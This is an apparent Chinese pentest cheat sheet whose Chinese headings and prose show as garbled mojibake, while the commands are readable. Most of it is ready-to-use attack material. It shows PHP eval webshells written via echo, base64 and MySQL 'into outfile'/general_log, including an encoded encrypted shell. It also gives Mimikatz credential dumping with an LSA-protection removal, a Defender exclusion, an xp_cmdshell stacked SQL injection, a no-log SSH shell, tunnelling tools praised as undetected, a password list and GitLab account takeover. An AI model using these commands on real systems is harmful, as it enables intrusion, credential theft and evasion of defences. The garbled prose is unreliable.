<h1 id="javaå‘½ä»¤æ‰§è¡Œ"><a href="#javaå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="javaå‘½ä»¤æ‰§è¡Œ"></a>javaå‘½ä»¤æ‰§è¡Œ</h1><p>å¦‚ä¸‹ç¼–ç ç½‘ç«™ï¼š<br><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a><br><a target="_blank" rel="noopener" href="https://r0yanx.com/tools/java_exec_encode/">https://r0yanx.com/tools/java_exec_encode/</a><br><a target="_blank" rel="noopener" href="https://www.bugku.net/runtime-exec-payloads/">https://www.bugku.net/runtime-exec-payloads/</a>   </p>
<p>æ‰‹åŠ¨ç¼–ç æ“ä½œ  </p>
<pre><code>bash -c &#123;echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;
</code></pre>
<p>Windowsä¸‹</p>
<pre><code>getRuntime().exec(\&quot;cmd /c echo 1 &gt; D://tomcat//webapps//ROOT//90s.txt\&quot;);
</code></pre>
<h2 id="å‘½ä»¤æ‰§è¡Œï¼Œå®šä½èµ„æºæ–‡ä»¶å†™æ–‡ä»¶å›æ˜¾"><a href="#å‘½ä»¤æ‰§è¡Œï¼Œå®šä½èµ„æºæ–‡ä»¶å†™æ–‡ä»¶å›æ˜¾" class="headerlink" title="å‘½ä»¤æ‰§è¡Œï¼Œå®šä½èµ„æºæ–‡ä»¶å†™æ–‡ä»¶å›æ˜¾"></a>å‘½ä»¤æ‰§è¡Œï¼Œå®šä½èµ„æºæ–‡ä»¶å†™æ–‡ä»¶å›æ˜¾</h2><p>Linux</p>
<pre><code>find /|grep index.js|while read f;do sh -c &quot;whoami&quot; &gt;$(dirname $f)/test.txt;done
</code></pre>
<p>Windows(æ³¨æ„ç›˜ç¬¦)</p>
<pre><code>for /r D:\ %i in (index.js*) do whoami &gt; %i/../test.txt
</code></pre>
<h2 id="å†™shell"><a href="#å†™shell" class="headerlink" title="å†™shell"></a>å†™shell</h2><p>åœ¨windowsä¸­ï¼Œæ‰¹å¤„ç†éœ€è¦è½¬ä¹‰å­—ç¬¦ä¸»è¦æœ‰ â€œ&amp;â€ï¼Œâ€œ|â€ï¼Œâ€œ&lt;â€ï¼Œâ€œ&gt;â€ç­‰ç­‰ï¼Œè½¬ä¹‰å­—ç¬¦ä¸ºâ€^â€<br>åœ¨Linuxä¸­ï¼Œéœ€è¦è½¬ä¹‰å­—ç¬¦ä¸»è¦æ˜¯ å•å¼•å· æˆ–è€…åŒå¼•å· å¯¹äºå•å¼•å·ï¼Œæˆ‘ä»¬å°†å…¶æ›¿æ¢ä¸º\47å³å¯ã€‚<br>windowså‘½ä»¤è¡Œæœ€å¤§é•¿åº¦ä¸º8191,16è¿›åˆ¶é•¿åº¦æ˜¯113898ã€‚echoå†™æ–‡ä»¶æ—¶æ³¨æ„é•¿åº¦ã€‚  </p>
<p>æ–¹æ³•1</p>
<pre><code>set /p=qaxnb&lt;nul&gt;d:\1d13.txt
</code></pre>
<p>æ–¹æ³•2</p>
<pre><code>echo qaxnb&gt;1we.txt
</code></pre>
<p>è¿½åŠ å†…å®¹</p>
<pre><code>echo qaxnb&gt;&gt;1we.txt
</code></pre>
<p>ä¸æ¢è¡Œè¿½åŠ </p>
<pre><code>set /p=&quot;121d2&quot;&gt;&gt;a.txt
</code></pre>
<p>è§„é¿ç©ºæ ¼</p>
<pre><code>echo.123&gt;&gt;a.txt
echo,123&gt;&gt;a.txt
type;a.txt
</code></pre>
<p>å†™ç‰¹æ®Šå­—ç¬¦å¾ˆå¤šçš„æ–‡ä»¶ï¼Œå¯ä»¥ç”¨certutilç¼–ç å†è¿˜åŸã€‚<br>å¦‚ä¸‹è¿˜åŸ</p>
<pre><code>certutil -f -decode 111.txt C:\\111.jsp
certutil -decodehex 111.txt C:\\111.jsp
</code></pre>
<p>linuxä¸‹base64</p>
<pre><code>echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php
</code></pre>
<p>phpçš„</p>
<pre><code>echo \&lt;\?php eval\(\@\$_POST\[1\]\)\; \?\&gt; &gt;1.php
</code></pre>
<p>ç»•è¿‡ç©ºæ ¼</p>
<pre><code>&gt; &lt; &lt;&gt; é‡å®šå‘ç¬¦
%09(éœ€è¦phpç¯å¢ƒ)
$&#123;IFS&#125;
$IFS$9
&#123;cat,flag.php&#125;
%20
%09
</code></pre>
<h1 id="windowsæ‰“åŒ…ç›®å½•"><a href="#windowsæ‰“åŒ…ç›®å½•" class="headerlink" title="windowsæ‰“åŒ…ç›®å½•"></a>windowsæ‰“åŒ…ç›®å½•</h1><pre><code>powershell -Command &quot;Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip&quot;
</code></pre>
<h1 id="åŒ¿åæ–‡ä»¶å­˜å‚¨"><a href="#åŒ¿åæ–‡ä»¶å­˜å‚¨" class="headerlink" title="åŒ¿åæ–‡ä»¶å­˜å‚¨"></a>åŒ¿åæ–‡ä»¶å­˜å‚¨</h1><p>å¯ç”¨å‘½ä»¤è¡Œ<br><a target="_blank" rel="noopener" href="https://transfer.sh/">https://transfer.sh/</a><br>ä½¿ç”¨å¾ˆç®€å•   </p>
<pre><code>ä¸Šä¼ ï¼ŒæˆåŠŸåè¿”å›éšæœºè·¯å¾„
curl --upload-file ./hello.txt https://transfer.sh/hello.txt

è·å–
https://transfer.sh/fF6OA7aF8o/hello.txt
</code></pre>
<h2 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h2><pre><code>nbtscan.exe 10.11.1.0/24
</code></pre>
<h2 id="doså‘½ä»¤å­˜æ´»ä¸»æœºæ¢æµ‹"><a href="#doså‘½ä»¤å­˜æ´»ä¸»æœºæ¢æµ‹" class="headerlink" title="doså‘½ä»¤å­˜æ´»ä¸»æœºæ¢æµ‹"></a>doså‘½ä»¤å­˜æ´»ä¸»æœºæ¢æµ‹</h2><pre><code>for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr &quot;TTL=&quot;
</code></pre>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>åªæ‰§è¡Œ ping æ‰«æã€‚å®ƒä¸ä¼šè¿›è¡Œä»»ä½•ç«¯å£æ‰«ææˆ–æœåŠ¡&#x2F;ç‰ˆæœ¬æ£€æµ‹</p>
<pre><code>nmap -sn 10.11.1.0/24
</code></pre>
<p>SYNæ‰«æï¼Œä¸ping</p>
<pre><code>sudo nmap -sS -Pn 192.168.10.1/24
</code></pre>
<p>udpå‘åŒ…æ¢æµ‹å­˜æ´»ï¼Œæ¯”è¾ƒæ…¢</p>
<pre><code>sudo nmap -sU -Pn 10.11.1.0/24
</code></pre>
<p>å¤šç§æ–¹å¼ï¼Œè¿›è¡Œå­˜æ´»æ¢æµ‹(TCP ACKã€TCP FIN å’Œ UDP æ•°æ®åŒ…æ¥æ¢æµ‹ä¸»æœº)</p>
<pre><code>sudo nmap -PA -Pn 192.168.10.1/24
</code></pre>
<p>æ‰«æç‰ˆæœ¬ï¼Œå…¨ç«¯å£</p>
<pre><code>nmap -sV -p- 10.11.1.0
</code></pre>
<pre><code>nmap 10.11.1.0 --script vuln
</code></pre>
<pre><code>nmap -p445 10.11.1.0 --script smb-vuln-ms17-010
</code></pre>
<pre><code>nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG tmp -iL ip.txt | awk &#39;&#123;print $5&#125;&#39; | grep -v &quot;latency).&quot; &gt;ok_ip.txt
</code></pre>
<p>nmap æé€Ÿæ‰«æï¼Œå¿«å¦‚é—ªç”µ</p>
<pre><code>nmap -n --unique --resolve-all -Pn --min-hostgroup 64 --max-retries 0 --host-timeout 10m --script-timeout 3m -oX &#123;filename&#125; --version-intensity 9 --min-rate 10000 -T4 192.168.23.1
nmap -n --resolve-all -Pn --min-hostgroup 64 --max-retries 0 --host-timeout 10m --script-timeout 3m -oX &#123;filename&#125; --version-intensity 9 --min-rate 10000 -T4 192.168.23.1
</code></pre>
<p>è·å–http title</p>
<pre><code>nmap -n --resolve-all -Pn --min-hostgroup  --max-retries 3 --host-timeout 10m --script-timeout 3m --version-intensity 9 --min-rate 10000 --script=http-title -T4 -p- -iL domain.txt
</code></pre>
<h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h2><p>æ³¨æ„é€Ÿç‡é—®é¢˜,æ ¹æ®å¸¦å®½è°ƒæ•´ã€‚100må¸¦å®½å¯è°ƒ3000,æ³¨æ„æ˜¯vpsï¼Œä¸æ˜¯å®¶åº­å®½å¸¦ã€‚   </p>
<p>å…³äºç¼–è¯‘ï¼Œç›´æ¥gitæ‹‰ä¸‹æ¥ï¼Œmakeå°±è¡Œã€‚ç”Ÿæˆçš„æ–‡ä»¶åœ¨binä¸‹é¢ã€‚<br>æ‰«æå•ip   </p>
<pre><code>masscan 192.168.1.110 -p 1-65535 --rate=1000
</code></pre>
<p>æ‰«æåˆ—è¡¨</p>
<pre><code>masscan -iL ip.txt -p1-65535 --rate=1000 -oL port.txt
</code></pre>
<p>è§£æ,æå–ip:port</p>
<pre><code>cat port.txt |awk &#39;&#123;print $4&quot;:&quot;$3&#125;&#39;
</code></pre>
<p>è½¬æ¢ä¸ºnmapå¯ç”¨ç«¯å£</p>
<pre><code>cat p.txt | tr &quot;\n&quot; ,
</code></pre>
<h2 id="ç«¯å£åˆ—è¡¨"><a href="#ç«¯å£åˆ—è¡¨" class="headerlink" title="ç«¯å£åˆ—è¡¨"></a>ç«¯å£åˆ—è¡¨</h2><pre><code>22,23,135,445,389,3389,80,443,8080,7001,3306,1433,1521,6379,27017,2375,5900,5432,4899

21-23,80-90,135,137,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2375,2376,2601,2604,3128,3306,3311,3312,3389,4440,4848,5001,5432,5560,5900-5902,6082,6379,7001-7010,7778,8009,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,51111,50030,50060

20-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50050,50300,50389,50500,50636,50800,51111,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389
</code></pre>
<h2 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h2><details>
<summary>top200</summary>

<pre><code>123456
password
123456789
12345678
12345
qwerty
123123
111111
abc123
1234567
dragon
1q2w3e4r
sunshine
654321
master
1234
football
1234567890
000000
computer
666666
superman
michael
internet
iloveyou
daniel
1qaz2wsx
monkey
shadow
jessica
letmein
baseball
whatever
princess
abcd1234
123321
starwars
121212
thomas
zxcvbnm
trustno1
killer
welcome
jordan
aaaaaa
123qwe
freedom
password1
charlie
batman
jennifer
7777777
michelle
diamond
oliver
mercedes
benjamin
11111111
snoopy
samantha
victoria
matrix
george
alexander
secret
cookie
asdfgh
987654321
123abc
orange
fuckyou
asdf1234
pepper
hunter
silver
joshua
banana
1q2w3e
chelsea
1234qwer
summer
qwertyuiop
phoenix
andrew
q1w2e3r4
elephant
rainbow
mustang
merlin
london
garfield
robert
chocolate
112233
samsung
qazwsx
matthew
buster
jonathan
ginger
flower
555555
test
caroline
amanda
maverick
midnight
martin
junior
88888888
anthony
jasmine
creative
patrick
mickey
123
qwerty123
cocacola
chicken
passw0rd
forever
william
nicole
hello
yellow
nirvana
justin
friends
cheese
tigger
mother
liverpool
blink182
asdfghjkl
andrea
spider
scooter
richard
soccer
rachel
purple
morgan
melissa
jackson
arsenal
222222
qwe123
gabriel
ferrari
jasper
danielle
bandit
angela
scorpion
prince
maggie
austin
veronica
nicholas
monster
dexter
carlos
thunder
success
hannah
ashley
131313
stella
brandon
pokemon
joseph
asdfasdf
999999
metallica
december
chester
taylor
sophie
samuel
rabbit
crystal
barney
xxxxxx
steven
ranger
patricia
christian
asshole
spiderman
sandra
hockey
angels
security
parker
heather
888888
victor
harley
333333
system
slipknot
november
jordan23
canada
tennis
qwertyui
casper
</code></pre>
</details>

<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><p>ä¸€æ¡å‘½ä»¤</p>
<pre><code>.\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit
</code></pre>
<p>æ§åˆ¶å°æ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œç”¨logé˜²æ­¢è¿›ç¨‹å´©æºƒï¼Œæ•°æ®ä¸¢å¤±</p>
<pre><code>mimikatz # privilege::debug
mimikatz # log
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
</code></pre>
<p>msfä¸­æ‰§è¡Œå‘½ä»¤</p>
<pre><code>mimikatz_command -f sekurlsa::logonPasswords full
mimikatz_command -f sekurlsa::wdigest
</code></pre>
<p>æ³¨å†Œè¡¨å¼€å¯wdigest,08r2åé»˜è®¤å…³é—­ã€‚éœ€è¦ç›®æ ‡æ³¨é”€ï¼Œé‡æ–°ç™»å½•ã€‚2016éœ€è¦é‡å¯ã€‚</p>
<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
</code></pre>
<h3 id="bypass-lsa-Protection-ppl"><a href="#bypass-lsa-Protection-ppl" class="headerlink" title="bypass lsa Protection(ppl)"></a>bypass lsa Protection(ppl)</h3><p>æŸ¥è¯¢æ˜¯å¦å¯ç”¨</p>
<pre><code>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
</code></pre>
<p>æŠŠmimidriver.sysæ‹·è´åˆ°åŒçº§ç›®å½•ï¼Œè¿›è¡ŒåŠ è½½bypass</p>
<pre><code>mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # privilege::debug    
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
mimikatz # !processprotect /process:lsass.exe
mimikatz # !-
</code></pre>
<h2 id="cså‡­è¯è§£æ"><a href="#cså‡­è¯è§£æ" class="headerlink" title="cså‡­è¯è§£æ"></a>cså‡­è¯è§£æ</h2><p>æå–ç”¨æˆ·å</p>
<pre><code>awk -F&quot;:::&quot; &#39;&#123;print $1&#125;&#39; credentials.txt | awk -F&quot;\\&quot; &#39;&#123;print $2&#125;&#39;
</code></pre>
<p>æå–hash</p>
<pre><code>awk -F&quot;:::&quot; &#39;&#123;print $2&#125;&#39; credentials.txt
</code></pre>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>Defenderæ’é™¤é¡¹</p>
<pre><code>powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath &quot;C:\test&quot;
</code></pre>
<h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><pre><code>gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt
</code></pre>
<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><pre><code>python3 dirsearch.py -e php,html,js -u https://target
</code></pre>
<pre><code>python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist
</code></pre>
<pre><code>python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20
</code></pre>
<pre><code>python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080
</code></pre>
<pre><code>python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080
</code></pre>
<h2 id="ä»£ç†å·¥å…·"><a href="#ä»£ç†å·¥å…·" class="headerlink" title="ä»£ç†å·¥å…·"></a>ä»£ç†å·¥å…·</h2><p>proxychain<br>sockscap64<br>proxifier<br>ccproxy<br>sockscap</p>
<p><a target="_blank" rel="noopener" href="https://www.mediafire.com/folder/32rj1769a2w82/v4.7">https://www.mediafire.com/folder/32rj1769a2w82/v4.7</a>   </p>
<h2 id="å†…ç½‘ç©¿é€å·¥å…·"><a href="#å†…ç½‘ç©¿é€å·¥å…·" class="headerlink" title="å†…ç½‘ç©¿é€å·¥å…·"></a>å†…ç½‘ç©¿é€å·¥å…·</h2><h3 id="fuso"><a href="#fuso" class="headerlink" title="fuso"></a>fuso</h3><ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/editso/fuso.git">https://github.com/editso/fuso.git</a>   </p>
</li>
<li><p>ç›¸å¯¹å†·é—¨ï¼Œä¸ä¼šè¢«æ€<br>åœ¨9004ä¸Šå¼€å¯socks5ä»£ç†  </p>
<pre><code>fuc.exe 159.138.0.0 9003 -h 127.0.0.1 -p 9004 -b 9004 -n test -t socks5 --bridge-host 0.0.0.0 --bridge-port 9004
</code></pre>
</li>
</ul>
<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<pre><code>frps -c frps.ini
# å®¢æˆ·ç«¯
frpc -c frpc.in
 
 i#æœåŠ¡ç«¯é…ç½®
    [common]
    bind_port=8080

#é¶æœºå®¢æˆ·ç«¯
    [common]
    server_addr=æœåŠ¡å™¨ç«¯å¤–ç½‘IP
    server_port=8080
    [socks5]
    type=tcp
    remote_port=12345
    plugin=socks5
    use_encryption=true
    use_compression=true
</code></pre>
<h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><p><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a>     </p>
<pre><code> sudo ./nps install
 sudo nps start
</code></pre>
<p>å®‰è£…åé…ç½®æ–‡ä»¶ä½ç½®&#x2F;etc&#x2F;npsï¼Œé»˜è®¤å¯†ç (å¯åœ¨é…ç½®æ–‡ä»¶é‡Œé¢ä¿®æ”¹)admin&#x2F;123  </p>
<h3 id="iox"><a href="#iox" class="headerlink" title="iox"></a>iox</h3><h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><p><a target="_blank" rel="noopener" href="https://github.com/lz520520/Stowaway">https://github.com/lz520520/Stowaway</a></p>
<h3 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h3><p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p>
<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>æ— è®°å½•shell</p>
<pre><code> ssh -T root@192.168.1.1 /usr/bin/bash -i
</code></pre>
<h2 id="grepæœç´¢"><a href="#grepæœç´¢" class="headerlink" title="grepæœç´¢"></a>grepæœç´¢</h2><pre><code>grep -E &quot;([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;&quot; -r xxx --color=auto
</code></pre>
<pre><code>grep -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; -r xxx --color=auto
</code></pre>
<pre><code>grep -EHirn &quot;accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into&quot; APKfolder/
</code></pre>
<pre><code>grep -ohr -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; /app/ |sort|uniq &gt;&gt; test.txt
</code></pre>
<p>webåº”ç”¨</p>
<pre><code>grep -EHirn &#39;--include=*.&#39;&#123;java,jsp,jspx,xml,conf,json,ini,properties,yaml,toml,plist,txt,sql&#125; &quot;accesskey|api_key|apikey|jdbc|username|pass|passwd|password&quot; webapps/
</code></pre>
<p>æœç´¢æ–‡ä»¶å†…çš„å­—ç¬¦ä¸²</p>
<pre><code>grep -r &quot;test&quot; ./src

æ˜¾ç¤ºè¡Œå·
grep -rn &quot;test&quot; ./src
</code></pre>
<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>å¼€è¿œç¨‹</p>
<pre><code>use mysql;  
update user set host = &#39;%&#39; where user = &#39;root&#39;;  
FLUSH PRIVILEGES ;  
select host, user from user;
 mysql -uroot -p -e &quot;select * from mysql.user;&quot; &gt;1.txt
</code></pre>
<p>ä¸ç™»å½•ç›´æ¥æ‰§è¡Œsql</p>
<pre><code>mysql -uaHmin -proot test -e &quot;select now()&quot; -N &gt;H:/work/target1.txt
mysql -uroot -e &quot;show databases;&quot; &gt;1.txt
</code></pre>
<p>mysql getshell</p>
<pre><code>show variables like &#39;%secure%&#39;    
select &#39;&lt;?php eval($_POST[xxx]) ?&gt;&#39; into outfile &#39;/var/www/xx.php&#39;;  
select &#39;&lt;?php eval($_POST[xx]) ?&gt;&#39; into dumpfile &#39;/var/www/xx.php&#39;;  
</code></pre>
<pre><code>set global general_log=on;  
set global general_log_file=&#39;/var/www/1.php&#39;;  
select &#39;&lt;?php eval($_POST[s6]) ?&gt;&#39;;
</code></pre>
<pre><code>select &#39;&lt;?php file_put_contents(&quot;abab.php&quot;,base64_decode(&quot;Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K&quot;));?&gt;&#39; into outfile &#39;C:/wamp/www/abb.php&#39;;
</code></pre>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot; --proxy &quot;http://127.0.0.1:1080&quot;
</code></pre>
<pre><code>python sqlmap.py  -u &quot;http://www.vuln.cn&quot; â€“cookie &quot;id=11&quot; --level 2
</code></pre>
<pre><code>python sqlmap.py -u &quot;www.xxxx.com/product/detail/id/3*.html&quot; --dbms=mysql -v 3 
</code></pre>
<pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot;  --dbms mysql  --dbs
</code></pre>
<pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=*&quot;  --dbms mysql  --dbs
</code></pre>
<pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot;  --dbms mysql  -D test --tables
</code></pre>
<pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot;  --dbms mysql  -D test -T admin â€“-columns
</code></pre>
<pre><code>python sqlmap.py -u &quot;http://www.vuln.cn/post.php?id=1&quot;  --dbms mysql -D test -T admin -C &quot;username,password&quot; --dump
</code></pre>
<pre><code>python sqlmap.py -r &quot;c:\request.txt&quot; -p id â€“dbms mysql â€“file-read=&quot;e:\www\as\config.php&quot;
</code></pre>
<h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><p>å †å æ³¨å…¥ï¼Œxpcmdshell</p>
<pre><code>http://www.vuln.cn/post.php?id=11;DECLARE/**/@ljbd/**/VARCHAR(8000);SET/**/@ljbd=0x70696e67202d6e6320312077772e36373332396163312e646e732e313433332e65752e6f7267;EXEC/**/master..xp_cmdshell/**/@ljbd--
</code></pre>
<h2 id="gitlabç›¸å…³"><a href="#gitlabç›¸å…³" class="headerlink" title="gitlabç›¸å…³"></a>gitlabç›¸å…³</h2><p>è¿›å…¥æ§åˆ¶å°</p>
<pre><code>gitlab-rails console production
å¦‚æœæ²¡é…ç½®ç¯å¢ƒå˜é‡ï¼Œcdåˆ°å®‰è£…ç›®å½•ä¸‹

/bin/rails console production

å¦‚æœæŠ¥é”™å¯ç”¨
./rails console -e production
</code></pre>
<p>ä¿®æ”¹å¯†ç </p>
<pre><code>é€šè¿‡ç”¨æˆ·åæŸ¥æ‰¾ï¼Œèµ‹å€¼ç»™user
user = User.where(username:&quot;root&quot;).first

ä¿®æ”¹å¯†ç 
user.password = &quot;abc123&quot;
user.password_confirmation= &quot;abc123&quot;
user.save!
</code></pre>
<p>æŠŠç”¨æˆ·è®¾ä¸ºadmin</p>
<pre><code>é€šè¿‡ç”¨æˆ·åæŸ¥æ‰¾ï¼Œèµ‹å€¼ç»™user
user = User.where(username:&quot;test&quot;).first
user.admin=ture
user.save!
</code></pre>
